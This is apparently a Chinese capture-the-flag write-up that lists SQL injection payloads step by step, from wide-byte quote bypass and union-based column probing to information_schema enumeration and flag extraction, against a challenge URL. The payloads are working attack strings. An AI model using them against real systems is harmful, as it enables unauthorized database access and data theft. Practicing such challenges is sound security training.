# SQL注入payload

```
http://103.238.227.13:10083/?id=1%df%27 order by 2%23
测试出字段数为2

http://103.238.227.13:10083/?id=1%df%27 union select 1,2%23
测试能否利用利用字段回显

http://103.238.227.13:10083/?id=1%df%27 union select 1,database()%23
获取当前使用的数据库 当前使用数据库为 sql5

根据题目提醒 数据表为key 字段为string 且id字段为1 构建获取数据的payload
http://103.238.227.13:10083/?id=1%df%27 union select 1,string from sql5.key where id = 1%23
```
```

很简单的注入    id 遍历表单发现 有4个表
然后  id=-1' union select 1,2,3,4 #、
发现都有回显，很简单的一个联合注入   
一步一步就出来结果了  
id=-1' union select 1,2,3, database()# 暴库
id=-1' union select 1,2,3, group_concat(table_name) from information_schema.tables where table_schema=database()#爆表
id=-1' union select 1,2,3, group_concat(column_name) from information_schema.columns where table_name=0x666c3467#爆字段
id=-1' union select 1,2,3,skctf_flag from fl4g#爆内容
```

